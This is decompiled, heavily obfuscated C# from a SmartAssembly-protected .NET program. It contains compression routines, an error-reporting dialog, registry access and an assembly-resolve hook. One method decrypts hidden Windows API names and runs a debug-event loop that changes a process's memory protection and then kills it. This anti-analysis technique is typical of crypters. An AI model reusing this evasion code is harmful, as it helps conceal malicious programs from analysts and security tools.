using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns1;
using ns10;
using ns11;
using ns12;
using ns13;
using ns3;
using ns5;
using ns8;
using ns9;

internal class Class56
{
	static int smethod_0(Class31.Class41 class41_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class41_0.int_2 >= 8)
		{
			class41_0.byte_0[class41_0.int_1++] = (byte)class41_0.uint_0;
			class41_0.uint_0 >>= 8;
			class41_0.int_2 -= 8;
		}
		if (int_1 > class41_0.int_1 - class41_0.int_0)
		{
			int_1 = class41_0.int_1 - class41_0.int_0;
			Array.Copy(class41_0.byte_0, class41_0.int_0, byte_0, int_0, int_1);
			class41_0.int_0 = 0;
			class41_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class41_0.byte_0, class41_0.int_0, byte_0, int_0, int_1);
			class41_0.int_0 += int_1;
		}
		return int_1;
	}

	static string smethod_1()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class30.SubkeyApplication);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class30.WowSubkeyApplication);
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_2(Class31.Class34 class34_0, int int_0)
	{
		int num = class34_0.int_1++;
		while (num != 32768)
		{
			class34_0.byte_0[class34_0.int_0++] = (byte)int_0;
			if (!eBBp0Op7wSDKHwLe0VT())
			{
				continue;
			}
			switch (4)
			{
			case 0:
			case 3:
				continue;
			case 4:
				class34_0.int_0 &= 32767;
				return;
			}
			break;
		}
		throw new InvalidOperationException();
	}

	static bool smethod_3(byte[] byte_0, Class44.Class48 class48_0, Class44 class44_0)
	{
		byte[] byte_;
		try
		{
			byte_ = Class56.smethod_88(byte_0);
		}
		catch (Exception)
		{
			Class56.smethod_51(class44_0, Enum4.const_0, Class31.string_0);
			return false;
		}
		byte[] array = Class56.smethod_165(byte_, "<RSAKeyValue><Modulus>zILNvNZLY417yraNPBkiV37+19L3/Q7eVMJXnEh3tV1CCAvjJBhLN6FZMaarfa/0px6Tg3DGKWJEaaxe/gM3X86m0R21X3IpDTmGaJrGf+C+r98eM3yPAmdwDs2xBe/J4iyQHmd6MA+Dym3d5aeKttHGKNRzgUavOYRU/GyQHks=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class56.smethod_51(class44_0, Enum4.const_0, Class43.string_0);
			return false;
		}
		Class56.smethod_105(class44_0, Enum4.const_1);
		Class57 @class = new Class57("d98c1dd4-008f-04b2-e980-0998ecf8427e");
		if (class44_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class44_0.iwebProxy_0;
		}
		Class44.Class46 class2 = new Class44.Class46(class44_0, array, @class, class48_0);
		Class56.smethod_79(@class, (Delegate21)class2.method_0);
		return class2.bool_0;
	}

	static void smethod_4(Form1 form1_0)
	{
		//IL_02f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fb: Expected O, but got Unknown
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Expected O, but got Unknown
		while (true)
		{
			IL_0457:
			form1_0.button_1 = new Button();
			int num = 16;
			if (J5IwCwpfghTToLC3MgK())
			{
				goto IL_02a0;
			}
			goto IL_0400;
			IL_0400:
			while (true)
			{
				switch (num)
				{
				case 14:
				case 18:
					((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
					((Form)form1_0).set_MaximizeBox(false);
					break;
				case 17:
					break;
				case 11:
					goto IL_0026;
				case 0:
					goto IL_005b;
				case 1:
					goto IL_0067;
				case 8:
					goto IL_0077;
				case 4:
					goto IL_008e;
				case 7:
					goto IL_00cf;
				case 13:
					goto IL_00ed;
				case 5:
					goto IL_0169;
				case 9:
					goto IL_0228;
				case 10:
					goto IL_0251;
				case 2:
					goto IL_02a0;
				case 3:
				case 12:
					goto IL_02d7;
				case 16:
					form1_0.button_0 = new Button();
					form1_0.control1_0 = new Control1();
					form1_0.class53_0 = new Class53();
					form1_0.control2_0 = new Control2();
					((Control)form1_0).SuspendLayout();
					((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
					((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
					((Control)form1_0.button_1).set_Location(new Point(308, 188));
					((Control)form1_0.button_1).set_Name("quitButton");
					((Control)form1_0.button_1).set_Size(new Size(100, 24));
					goto case 15;
				case 15:
					((Control)form1_0.button_1).set_TabIndex(0);
					((Control)form1_0.button_1).set_Text("&Quit");
					((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
					((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
					((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
					((Control)form1_0.button_0).set_Location(new Point(202, 188));
					((Control)form1_0.button_0).set_Name("continueButton");
					goto IL_02d7;
				default:
					num = 13;
					if (!J5IwCwpfghTToLC3MgK())
					{
					}
					continue;
				case 6:
					goto IL_0457;
				case 19:
					return;
				}
				break;
			}
			goto IL_0014;
			IL_0014:
			((Form)form1_0).set_MinimizeBox(false);
			((Control)form1_0).set_Name("SecurityExceptionForm");
			goto IL_0026;
			IL_0026:
			((Form)form1_0).set_ShowInTaskbar(false);
			((Form)form1_0).set_StartPosition((FormStartPosition)1);
			((Control)form1_0).set_Text("%AppName%");
			((Control)form1_0).ResumeLayout(false);
			num = 19;
			if (J5IwCwpfghTToLC3MgK())
			{
				goto IL_02d7;
			}
			goto IL_0400;
			IL_02d7:
			((Control)form1_0.button_0).set_Size(new Size(100, 24));
			goto IL_005b;
			IL_005b:
			((Control)form1_0.button_0).set_TabIndex(1);
			goto IL_0067;
			IL_0067:
			((Control)form1_0.button_0).set_Text("&Continue");
			goto IL_0077;
			IL_0077:
			((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
			goto IL_008e;
			IL_008e:
			((Control)form1_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
			((Control)form1_0.control1_0).set_Dock((DockStyle)1);
			((Control)form1_0.control1_0).set_ForeColor(Color.White);
			form1_0.control1_0.IconState = Enum5.const_2;
			goto IL_00cf;
			IL_00cf:
			form1_0.control1_0.Image = null;
			((Control)form1_0.control1_0).set_Location(new Point(0, 0));
			goto IL_00ed;
			IL_00ed:
			((Control)form1_0.control1_0).set_Name("headerControl1");
			((Control)form1_0.control1_0).set_Size(new Size(418, 58));
			((Control)form1_0.control1_0).set_TabIndex(7);
			((Control)form1_0.control1_0).set_TabStop(false);
			((Control)form1_0.control1_0).set_Text("%AppName% attempted to perform an operation not allowed by the security policy.");
			((Control)form1_0.class53_0).set_Anchor((AnchorStyles)13);
			((Label)form1_0.class53_0).set_FlatStyle((FlatStyle)3);
			((Control)form1_0.class53_0).set_Location(new Point(20, 72));
			goto IL_0169;
			IL_0169:
			((Control)form1_0.class53_0).set_Name("errorMessage");
			((Control)form1_0.class53_0).set_Size(new Size(382, 13));
			((Control)form1_0.class53_0).set_TabIndex(14);
			((Control)form1_0.class53_0).set_Text("errorMessage");
			((Label)form1_0.class53_0).set_UseMnemonic(false);
			((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
			((Control)form1_0.control2_0).set_Cursor(Cursors.get_Hand());
			((Control)form1_0.control2_0).set_Location(new Point(6, 186));
			((Control)form1_0.control2_0).set_Name("poweredBy");
			((Control)form1_0.control2_0).set_Size(new Size(120, 32));
			((Control)form1_0.control2_0).set_TabIndex(15);
			((Control)form1_0.control2_0).set_TabStop(false);
			goto IL_0228;
			IL_0228:
			((Control)form1_0.control2_0).set_Text("poweredBy1");
			((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
			((Control)form1_0).set_BackColor(SystemColors.Window);
			goto IL_0251;
			IL_0251:
			((Form)form1_0).set_ClientSize(new Size(418, 224));
			((Form)form1_0).set_ControlBox(false);
			((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_0);
			((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_1);
			((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control1_0);
			goto IL_02a0;
			IL_02a0:
			((Control)form1_0).get_Controls().Add((Control)(object)form1_0.class53_0);
			((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control2_0);
			num = 18;
			if (!eBBp0Op7wSDKHwLe0VT())
			{
				goto IL_0014;
			}
			goto IL_0400;
		}
	}

	static string smethod_5(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int num)
			{
				return num.ToString("x");
			}
			if (object_0 is long num2)
			{
				return num2.ToString("x");
			}
			if (object_0 is short num3)
			{
				return num3.ToString("x");
			}
			if (object_0 is uint num4)
			{
				return num4.ToString("x");
			}
			if (object_0 is ulong num5)
			{
				return num5.ToString("x");
			}
			if (object_0 is ushort num6)
			{
				return num6.ToString("x");
			}
			if (object_0 is byte b)
			{
				return b.ToString("x");
			}
			if (object_0 is sbyte b2)
			{
				return b2.ToString("x");
			}
			if (object_0 is IntPtr intPtr)
			{
				return intPtr.ToInt64().ToString("x");
			}
			if (object_0 is UIntPtr)
			{
				return ((UIntPtr)object_0).ToUInt64().ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_6(string string_0, EventArgs1 eventArgs1_0, string string_1)
	{
		Class56.smethod_94(string_0, eventArgs1_0.class45_0, string_1);
	}

	static Assembly smethod_7()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static bool smethod_8(Class31.Class32 class32_0)
	{
		int int_ = class32_0.int_4;
		int num = 11;
		if (!J5IwCwpfghTToLC3MgK())
		{
			int num2 = default(int);
			bool result = default(bool);
			while (true)
			{
				int num3;
				int num4;
				switch (num)
				{
				case 12:
					goto IL_001c;
				case 11:
					switch (int_)
					{
					case 2:
						break;
					case 3:
						goto IL_0168;
					case 4:
						goto IL_019c;
					case 5:
						goto IL_01c9;
					case 6:
						goto IL_0215;
					case 7:
					case 8:
					case 9:
					case 10:
						goto IL_0255;
					default:
						return false;
					case 12:
						return false;
					}
					if (!class32_0.bool_0)
					{
						num2 = Class56.smethod_48(class32_0.class33_0, 3);
						if (num2 >= 0)
						{
							Class56.smethod_71(class32_0.class33_0, 3);
							goto case 2;
						}
						return false;
					}
					class32_0.int_4 = 12;
					return false;
				case 2:
				case 5:
					if (((uint)num2 & (true ? 1u : 0u)) != 0)
					{
						goto case 1;
					}
					goto IL_00b5;
				case 1:
				case 3:
					class32_0.bool_0 = true;
					goto IL_00b5;
				case 6:
					break;
				default:
					return false;
				case 0:
					return true;
				case 9:
					class32_0.class35_1 = Class56.smethod_89(class32_0.class36_0);
					class32_0.int_4 = 7;
					goto IL_0255;
				case 4:
				case 7:
				case 8:
				case 13:
					{
						return result;
					}
					IL_0215:
					if (!Class56.smethod_101(class32_0.class36_0, class32_0.class33_0))
					{
						return false;
					}
					class32_0.class35_0 = Class56.smethod_107(class32_0.class36_0);
					goto case 9;
					IL_0255:
					return Class56.smethod_148(class32_0);
					IL_0168:
					if ((class32_0.int_8 = Class56.smethod_48(class32_0.class33_0, 16)) < 0)
					{
						return false;
					}
					Class56.smethod_71(class32_0.class33_0, 16);
					class32_0.int_4 = 4;
					goto IL_019c;
					IL_00b5:
					switch (num2 >> 1)
					{
					case 1:
						class32_0.class35_0 = Class31.Class35.class35_0;
						goto IL_001c;
					case 0:
						Class56.smethod_54(class32_0.class33_0);
						class32_0.int_4 = 3;
						break;
					case 2:
						class32_0.class36_0 = new Class31.Class36();
						class32_0.int_4 = 6;
						break;
					}
					break;
					IL_019c:
					num3 = Class56.smethod_48(class32_0.class33_0, 16);
					if (num3 < 0)
					{
						goto default;
					}
					Class56.smethod_71(class32_0.class33_0, 16);
					class32_0.int_4 = 5;
					goto IL_01c9;
					IL_01c9:
					num4 = Class56.smethod_169(class32_0.class34_0, class32_0.class33_0, class32_0.int_8);
					class32_0.int_8 -= num4;
					if (class32_0.int_8 == 0)
					{
						class32_0.int_4 = 2;
						goto case 0;
					}
					return !class32_0.class33_0.IsNeedingInput;
					IL_001c:
					class32_0.class35_1 = Class31.Class35.class35_1;
					class32_0.int_4 = 7;
					num = 6;
					if (!J5IwCwpfghTToLC3MgK())
					{
						continue;
					}
					goto case 4;
				}
				break;
			}
		}
		return true;
	}

	static void smethod_9(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly", writable: true);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			}
			registryKey.SetValue(string_0, string_1);
			registryKey.Close();
		}
		catch
		{
		}
	}

	static bool smethod_10(int int_0, Class31.Class38 class38_0, int int_1)
	{
		class38_0.short_0[class38_0.int_1] = (short)int_1;
		class38_0.byte_1[class38_0.int_1++] = (byte)(int_0 - 3);
		int num = Class56.smethod_110(class38_0, int_0 - 3);
		class38_0.class39_0.short_0[num]++;
		if (num >= 265 && num < 285)
		{
			class38_0.int_2 += (num - 261) / 4;
		}
		int num2 = Class56.smethod_140(class38_0, int_1 - 1);
		class38_0.class39_1.short_0[num2]++;
		if (num2 >= 4)
		{
			class38_0.int_2 += num2 / 2 - 1;
		}
		return Class56.smethod_59(class38_0);
	}

	static void smethod_11(Class31.Stream0 stream0_0, int int_0)
	{
		Class56.smethod_161(stream0_0, int_0);
		Class56.smethod_161(stream0_0, int_0 >> 16);
	}

	static void smethod_12(Class31.Class41 class41_0, int int_0, int int_1)
	{
		class41_0.uint_0 |= (uint)(int_0 << class41_0.int_2);
		while (true)
		{
			class41_0.int_2 += int_1;
			int num = 4;
			if (!J5IwCwpfghTToLC3MgK())
			{
			}
			while (true)
			{
				switch (num)
				{
				case 1:
				case 4:
					if (class41_0.int_2 >= 16)
					{
						class41_0.byte_0[class41_0.int_1++] = (byte)class41_0.uint_0;
						goto default;
					}
					return;
				default:
					class41_0.byte_0[class41_0.int_1++] = (byte)(class41_0.uint_0 >> 8);
					class41_0.uint_0 >>= 16;
					num = 5;
					if (!J5IwCwpfghTToLC3MgK())
					{
					}
					continue;
				case 0:
					break;
				case 5:
					class41_0.int_2 -= 16;
					return;
				}
				break;
			}
		}
	}

	static Type smethod_13(Class49 class49_0)
	{
		return class49_0.type_0;
	}

	static void smethod_14(Class31.Class40 class40_0)
	{
		Array.Copy(class40_0.byte_0, 32768, class40_0.byte_0, 0, 32768);
		class40_0.int_1 -= 32768;
		class40_0.int_4 -= 32768;
		class40_0.int_3 -= 32768;
		for (int i = 0; i < 32768; i++)
		{
			int num = class40_0.short_0[i] & 0xFFFF;
			class40_0.short_0[i] = (short)((num >= 32768) ? (num - 32768) : 0);
		}
		for (int j = 0; j < 32768; j++)
		{
			int num2 = class40_0.short_1[j] & 0xFFFF;
			class40_0.short_1[j] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
		}
	}

	static void smethod_15(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class56.smethod_46(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static string smethod_16(string string_0, Form1 form1_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static void smethod_17(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class56.smethod_96("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static void smethod_18(Control0 control0_0)
	{
		while (true)
		{
			control0_0.timer_0.set_Enabled(false);
			while (true)
			{
				control0_0.image_0 = null;
				while (true)
				{
					control0_0.bool_0 = false;
					while (true)
					{
						control0_0.string_0 = string.Empty;
						((Control)control0_0).Refresh();
						((Control)control0_0).set_Height(16);
						if (J5IwCwpfghTToLC3MgK())
						{
						}
						switch (6)
						{
						case 2:
							goto end_IL_0003;
						case 0:
						case 1:
							goto end_IL_004b;
						case 5:
							goto end_IL_0054;
						case 6:
							return;
						}
						continue;
						end_IL_0003:
						break;
					}
					continue;
					end_IL_004b:
					break;
				}
				continue;
				end_IL_0054:
				break;
			}
		}
	}

	static void smethod_19(Class31.Class38.Class39 class39_0)
	{
		int num = class39_0.short_0.Length;
		int num10 = default(int);
		int num12 = default(int);
		int num6 = default(int);
		int[] array3 = default(int[]);
		int num8 = default(int);
		int num9 = default(int);
		int[] array2 = default(int[]);
		int num7 = default(int);
		int num14 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		int num18 = default(int);
		int num15 = default(int);
		while (true)
		{
			int[] array = new int[num];
			while (true)
			{
				int num2 = 0;
				while (true)
				{
					IL_02d9:
					int num3 = 0;
					int num4 = 0;
					int num5 = 6;
					if (!eBBp0Op7wSDKHwLe0VT())
					{
						goto IL_015c;
					}
					goto IL_027f;
					IL_027f:
					while (true)
					{
						int num11;
						switch (num5)
						{
						case 18:
							break;
						case 11:
							goto IL_006d;
						case 2:
							goto IL_007a;
						case 12:
							goto IL_00b6;
						case 17:
							goto IL_00f2;
						case 5:
							goto IL_015c;
						case 16:
							num11 = num10;
							goto IL_017f;
						case 7:
							if (num12 != 0)
							{
								num11 = num2++;
								goto IL_017f;
							}
							goto IL_018e;
						case 3:
						case 6:
							if (num4 < num)
							{
								num12 = class39_0.short_0[num4];
								goto case 7;
							}
							while (num2 < 2)
							{
								int num13 = ((num3 < 2) ? (++num3) : 0);
								array[num2++] = num13;
							}
							class39_0.int_1 = Math.Max(num3 + 1, class39_0.int_0);
							num6 = num2;
							num5 = 10;
							if (J5IwCwpfghTToLC3MgK())
							{
							}
							continue;
						case 14:
							array3[num8] = class39_0.short_0[num9] << 8;
							goto default;
						default:
							array[num8] = num8;
							num8++;
							num5 = 0;
							if (!J5IwCwpfghTToLC3MgK())
							{
								continue;
							}
							goto IL_007a;
						case 10:
							array2 = new int[4 * num2 - 2];
							array3 = new int[2 * num2 - 1];
							num7 = num6;
							num8 = 0;
							goto case 0;
						case 0:
							if (num8 >= num2)
							{
								goto IL_0081;
							}
							num9 = array[num8];
							goto case 4;
						case 4:
							array2[2 * num8] = num9;
							array2[2 * num8 + 1] = -1;
							goto case 14;
						case 13:
							goto IL_02d9;
						case 1:
						case 15:
							goto end_IL_02d9;
						case 8:
							goto end_IL_02f1;
						case 19:
							goto IL_02fe;
							IL_018e:
							num4++;
							goto case 3;
							IL_017f:
							if (num11 <= 0 || class39_0.short_0[array[num10 = (num11 - 1) / 2]] <= num12)
							{
								array[num11] = num4;
								num3 = num4;
								goto IL_018e;
							}
							array[num11] = array[num10];
							goto case 16;
						}
						break;
					}
					goto IL_000e;
					IL_000e:
					num14 = 0;
					for (num15 = 1; num15 < num2; num15 = num14 * 2 + 1)
					{
						if (num15 + 1 < num2 && array3[array[num15]] > array3[array[num15 + 1]])
						{
							num15++;
						}
						array[num14] = array[num15];
						num14 = num15;
					}
					goto IL_006d;
					IL_02fe:
					Class56.smethod_124(class39_0, array2);
					return;
					IL_006d:
					while ((num15 = num14) > 0)
					{
						if (array3[array[num14 = (num15 - 1) / 2]] > num16)
						{
							array[num15] = array[num14];
							continue;
						}
						goto IL_0167;
					}
					goto IL_015c;
					IL_0167:
					num5 = 5;
					if (J5IwCwpfghTToLC3MgK())
					{
					}
					goto IL_027f;
					IL_015c:
					array[num15] = num17;
					goto IL_007a;
					IL_007a:
					if (num2 > 1)
					{
						goto IL_0081;
					}
					goto IL_02fe;
					IL_0081:
					num18 = array[0];
					num17 = array[--num2];
					num14 = 0;
					num15 = 1;
					goto IL_00ca;
					IL_00ca:
					if (num15 < num2)
					{
						if (num15 + 1 < num2 && array3[array[num15]] > array3[array[num15 + 1]])
						{
							num15++;
						}
						goto IL_00b6;
					}
					num16 = array3[num17];
					goto IL_00f2;
					IL_00b6:
					array[num14] = array[num15];
					num14 = num15;
					num15 = num15 * 2 + 1;
					goto IL_00ca;
					IL_00f2:
					while ((num15 = num14) > 0 && array3[array[num14 = (num15 - 1) / 2]] > num16)
					{
						array[num15] = array[num14];
					}
					array[num15] = num17;
					int num19 = array[0];
					num17 = num7++;
					array2[2 * num17] = num18;
					array2[2 * num17 + 1] = num19;
					int num20 = Math.Min(array3[num18] & 0xFF, array3[num19] & 0xFF);
					num16 = (array3[num17] = array3[num18] + array3[num19] - num20 + 1);
					goto IL_000e;
					continue;
					end_IL_02d9:
					break;
				}
				continue;
				end_IL_02f1:
				break;
			}
		}
	}

	static void smethod_20(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class56.smethod_46(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_21()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class56.smethod_31;
		}
		catch
		{
		}
	}

	static void smethod_22(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_23(EventArgs0 eventArgs0_0, Class45 class45_0)
	{
		class45_0.delegate19_0?.Invoke(class45_0, eventArgs0_0);
	}

	static string smethod_24(string string_0, Form0 form0_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static int smethod_25(string string_0, int int_0, Graphics graphics_0, Font font_0)
	{
		try
		{
			return Class56.smethod_34(font_0, string_0, int_0, graphics_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class56.smethod_84(int_0, font_0, string_0, graphics_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static bool smethod_26(Class45 class45_0, string string_0)
	{
		try
		{
			byte[] byte_ = class45_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class56.smethod_88(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class56.smethod_165(byte_2, "<RSAKeyValue><Modulus>zILNvNZLY417yraNPBkiV37+19L3/Q7eVMJXnEh3tV1CCAvjJBhLN6FZMaarfa/0px6Tg3DGKWJEaaxe/gM3X86m0R21X3IpDTmGaJrGf+C+r98eM3yPAmdwDs2xBe/J4iyQHmd6MA+Dym3d5aeKttHGKNRzgUavOYRU/GyQHks=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{F0280EF0-7ADC-4BC9-80E4-1C939C365FDB}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_27(Class31.Class38 class38_0)
	{
		class38_0.int_1 = 0;
		class38_0.int_2 = 0;
	}

	static void smethod_28(string string_0, Control0 control0_0)
	{
		control0_0.string_0 = string_0;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class56.smethod_96((string_0.Length > 0) ? "error" : "ok");
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (string_0.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	static void smethod_29(Class31.Class40 class40_0)
	{
		class40_0.int_0 = (class40_0.byte_0[class40_0.int_4] << 5) ^ class40_0.byte_0[class40_0.int_4 + 1];
	}

	static void smethod_30(int int_0, uint uint_0, Class20.Struct0 struct0_0)
	{
		Class20.Delegate11 @delegate = Class17.smethod_1<Class20.Delegate11>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("IZRPfMpaEgyR6ZDyXnOYiJx08Wzx4ZAZWC/PdMnfamo="));
		Class20.Delegate12 delegate2 = Class17.smethod_1<Class20.Delegate12>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("8E4kyZwlQ3AJzMDUyZVD4tOSfAQxWsmg1leG/X3uOQo="));
		Class20.Delegate13 delegate3 = Class17.smethod_1<Class20.Delegate13>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("zyY3vUJrmonBTUubJ9UCC5TzDHj71hXOJ3SGrrAKtvU="));
		Class20.Delegate14 delegate4 = Class17.smethod_1<Class20.Delegate14>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("WNauUailUhceWvNacXsoZYxTSn28xUnXdaZLyAiTtuU="));
		Class20.Delegate2 delegate5 = Class17.smethod_1<Class20.Delegate2>(Class56.smethod_36("Sk1N1W/kLlYPS5rz2GRFew=="), Class56.smethod_36("w0qEzcCa4McG97qE1cgACdQlprmDa117VKUX1amgZAo="));
		Class20.Delegate10 delegate6 = Class17.smethod_1<Class20.Delegate10>(Class56.smethod_36("pdd3zZ5lwXtj8hV1GKRfVw=="), Class56.smethod_36("qt4tHmTORXFlu08c+szp/A=="));
		checked
		{
			if (!@delegate((int)struct0_0.uint_0))
			{
				throw new Exception();
			}
			delegate3(KillOnExit: false);
			uint lpflOldProtect = 64u;
			bool flag = true;
			while (true)
			{
				if (flag)
				{
					Class20.Struct2 lpDebugEvent = default(Class20.Struct2);
					if (!delegate2(out lpDebugEvent, -1))
					{
						break;
					}
					switch (lpDebugEvent.enum1_0)
					{
					case Class20.Enum1.const_2:
						if (lpDebugEvent.Exception.struct5_0.uint_0 == 2147483649u)
						{
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX REPROTECT FAILED");
							}
							break;
						}
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_02a0;
					case Class20.Enum1.const_0:
						try
						{
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								if (eBBp0Op7wSDKHwLe0VT())
								{
									switch (2)
									{
									case 0:
									case 2:
										break;
									default:
										goto IL_01e0;
									}
								}
								throw new Exception("VPEX FIRST FAILED");
							}
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								goto IL_01e0;
							}
							goto end_IL_017d;
							IL_01e0:
							throw new Exception("VPEX FIRST FAILED");
							end_IL_017d:;
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED2");
							}
							ProjectData.ClearProjectError();
						}
						if (delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
						{
							uint SuspendCount = 0u;
							if (delegate6(struct0_0.intptr_1, out SuspendCount) != -1)
							{
								Thread.Sleep(1000);
								delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
								goto IL_02a0;
							}
							throw new Exception("THREAD RESUME FAILED");
						}
						throw new Exception("VPEX FIRST FAILED2");
					default:
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_02a0;
					case Class20.Enum1.const_3:
						{
							flag = false;
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 1073807364);
							goto IL_02a0;
						}
						IL_02a0:
						GC.Collect();
						break;
					}
					continue;
				}
				try
				{
					Process.GetProcessById((int)struct0_0.uint_0).Kill();
					Process.GetCurrentProcess().Kill();
					return;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
					return;
				}
			}
			throw new Exception();
		}
	}

	static Assembly smethod_31(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class25.Struct13 @struct = new Class25.Struct13(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezAxZjc3YThmLTA5ZGMtNDE3My1hMjMzLTRhOTM5YzFmZDNhOH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{12743bc9-9d5c-4b18-9936-3a7be41403e9},ezAxZjc3YThmLTA5ZGMtNDE3My1hMjMzLTRhOTM5YzFmZDNhOH0=,[z]{12743bc9-9d5c-4b18-9936-3a7be41403e9}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class25.dictionary_0)
			{
